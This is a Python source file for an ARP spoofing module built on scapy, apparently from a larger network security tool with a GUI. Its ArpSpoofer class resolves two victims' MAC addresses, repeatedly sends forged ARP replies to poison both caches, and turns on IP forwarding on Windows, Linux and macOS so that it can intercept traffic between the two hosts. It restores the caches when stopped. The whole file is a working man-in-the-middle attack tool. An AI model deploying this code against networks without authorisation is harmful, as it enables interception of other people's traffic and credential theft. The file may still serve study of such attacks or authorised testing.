'''
Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
'''
import scapy.all as scapy
import threading, subprocess, time
from ..process import Process
import platform
# TODO get mac address better

class ArpSpoofer(Process):

    # Give up resolving the victims' MACs after this many seconds with no
    # reply, rather than searching forever (see tick).
    TIMEOUT_SECONDS = 10.0

    def __init__(self, buffer, context, interval: float = 1.0):
        super().__init__(buffer, context)
        self.interval = interval

        self.running = False
        self.forwarding_enabled = False
        self.timer: threading.Timer | None = None
        self.os_name = platform.system()
        # IP forwarding is turned on from the timer thread on the first tick,
        # not from start() on the GUI thread (it shells out and would block).
        self._setup_done = False
        # When to give up if the MACs still haven't resolved (see tick).
        self._deadline: float | None = None

        # Only meaningfully set once start() is called with real target/host
        # IPs, but declared here so their type is known throughout the class.
        self.target_ip: str | None = None
        self.host_ip: str | None = None
        self.target_mac: str | None = None
        self.host_mac: str | None = None
        # So the "now intercepting" confirmation (see tick) is logged once per
        # run, when both MACs are first resolved - not on every tick after.
        self._announced_active = False



    # Setup methods

    def tick(self):
        if not self.running:
            return

        # A failure here (e.g. scapy send/receive erroring) must not stop the
        # timer chain below from rescheduling - otherwise self.running stays
        # True forever while the spoofing has actually silently stopped.
        try:
            # First tick (on this timer thread, not the GUI's): turn on IP
            # forwarding, which shells out and would freeze the UI if start()
            # did it.
            if not self._setup_done:
                self._setup_done = True
                self.enable_ip_forwarding()

            # Resolve whichever MACs we still don't have, then spoof each
            # victim we can reach. get_mac blocks for its srp timeout, which
            # is why all of this runs off the GUI thread.
            if self.target_mac is None:
                self.target_mac = self.get_mac(self.target_ip)
            if self.host_mac is None:
                self.host_mac = self.get_mac(self.host_ip)

            if self.target_mac is not None:
                self.spoof(self.target_ip, self.target_mac, self.host_ip)
            if self.host_mac is not None:
                self.spoof(self.host_ip, self.host_mac, self.target_ip)

            if self.target_mac is not None and self.host_mac is not None:
                # Both victims answered - the spoof is now actually in effect.
                if not self._announced_active:
                    self._announced_active = True
                    self.buffer.put("arp", f"ARP Spoof active: now intercepting traffic between {self.target_ip} and {self.host_ip}.")
            elif self._deadline is not None and time.monotonic() >= self._deadline:
                # Still missing a MAC after the timeout - give up rather than
                # searching forever.
                missing = [ip for ip, mac in ((self.target_ip, self.target_mac), (self.host_ip, self.host_mac)) if mac is None]
                self.buffer.put_error("arp", f"Gave up after {self.TIMEOUT_SECONDS:.0f} seconds: no ARP reply from {', '.join(missing)}. "
                                             f"Check the IPs are on this network and powered on.", "arp_host_not_found")
                self.stop()
                return
        except Exception as e:
            self.buffer.put_error("arp", f"Error during ARP spoof tick: {e}", "arp_spoof_failed")

        self.timer = threading.Timer(self.interval, self.tick)
        self.timer.start()


    def start(self, target_ip, host_ip):

        if self.running:
            self.buffer.put("arp", "ARP Spoof is already running")
            return

        # target_ip='192.168.8.137', host_ip='192.168.8.243'
        scapy.conf.verb = 0

        self.target_ip = target_ip
        self.host_ip = host_ip

        # Don't resolve the MACs (or turn on IP forwarding) here - both block,
        # which on the GUI thread would freeze the app while the victims
        # answer. Leave the MACs None and let tick(), on its own timer thread,
        # do all of it; is_starting() reports the wait until both are resolved.
        self.target_mac = None
        self.host_mac = None
        self._announced_active = False
        self._setup_done = False
        self._deadline = time.monotonic() + self.TIMEOUT_SECONDS

        self.running = True

        self.buffer.put("arp", f"Starting ARP Spoof: intercepting between target {target_ip} and host {host_ip}; resolving MAC addresses...")

        # Kick off the first tick on a timer thread straight away, so start()
        # returns to the GUI at once (see the MAC/forwarding note above).
        self.timer = threading.Timer(0, self.tick)
        self.timer.start()


    def is_running(self):
        return self.running

    def is_starting(self):
        '''Running, but still waiting on one or both victims' MAC addresses.'''
        return self.running and (self.target_mac is None or self.host_mac is None)

    def stop(self):

        if self.running == False:
            self.buffer.put("arp", "ARP Spoof is not running")
            return

        self.buffer.put("arp", "Stopping ARP Spoof")

        self.running = False

        if self.timer:
            self.timer.cancel()

        # Only send restore packets if both victims' MACs were actually
        # resolved - with nothing spoofed there's nothing to restore, and
        # re-resolving them here would just block (and often fail anyway).
        if self.target_mac is not None and self.host_mac is not None:
            self.restore(self.target_ip, self.target_mac, self.host_ip, self.host_mac)
            self.restore(self.host_ip, self.host_mac, self.target_ip, self.target_mac)
        # disable forwarding
        if self.forwarding_enabled:
            self.disable_ip_forwarding()
        self.buffer.put("arp", "Stopped ARP Spoof.")


    # Useful methods
    
    def get_mac(self, ip: str):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        self.buffer.put("arp", "MAC address request", packet, "out")

        # A send/receive failure (no privilege, no interface) counts as "no
        # reply" - returning None lets tick()'s attempt counter time out,
        # rather than raising every tick and never giving up.
        try:
            answered, _ = scapy.srp(packet, timeout=2, verbose=False)
        except Exception:
            return None

        if answered:
            self.buffer.put("arp", "MAC address response", answered[0][1], "in")
            return answered[0][1].hwsrc


    def spoof(self, target_ip: str, target_mac: str, spoof_ip: str):
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op='is-at',
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
        )

        self.buffer.put("arp", "Spoofing packet", packet, "out")
        scapy.sendp(packet, verbose=False)


    def restore(self, destination_ip, destination_mac, source_ip, source_mac):
        # Uses the MACs already resolved during the spoof - stop() only calls
        # this once both are known, so there's no blocking re-resolution here.
        packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )

        self.buffer.put("arp", "Restore packet", packet, "out")
        scapy.sendp(packet, verbose=False)


    def enable_ip_forwarding(self):
        if self.os_name == "Windows":
            try:
                # Enables IPv4 and IPv6 packet forwarding globally on all connected interfaces
                subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Enabled"], check=True)
                print("IP forwarding enabled successfully via PowerShell.")
                self.forwarding_enabled = True
            except subprocess.CalledProcessError as e:
                print(f"PowerShell error: Check if Python is executing with Run As Administrator privileges. {e}")

        elif self.os_name == "Linux":
            # IP Forwarding is possible
            # enable forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            self.buffer.put("arp", "IP forwarding enabled.")
            self.forwarding_enabled = True

        elif self.os_name == "Darwin":
            # IP Forwarding is possible - macOS uses sysctl, not Linux's procfs path
            try:
                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
                self.buffer.put("arp", "IP forwarding enabled.")
                self.forwarding_enabled = True
            except subprocess.CalledProcessError as e:
                self.buffer.put_error("arp", f"Failed to enable IP forwarding: {e}", "ip_forwarding")

        else:
            self.buffer.put_error("arp", f"Running on an unidentified system: {self.os_name}. ARP spoofing may not work properly.", "ip_forwarding")

    def disable_ip_forwarding(self):
        if self.os_name == "Linux":
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            self.buffer.put("arp", "IP forwarding disabled.")
            self.forwarding_enabled = False
        elif self.os_name == "Windows":
            try:
                # Disables forwarding cleanly upon exit
                subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Disabled"], check=True)
                print("IP forwarding disabled successfully via PowerShell.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to reset interfaces: {e}")
        elif self.os_name == "Darwin":
            try:
                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], check=True)
                self.buffer.put("arp", "IP forwarding disabled.")
                self.forwarding_enabled = False
            except subprocess.CalledProcessError as e:
                self.buffer.put_error("arp", f"Failed to disable IP forwarding: {e}", "ip_forwarding")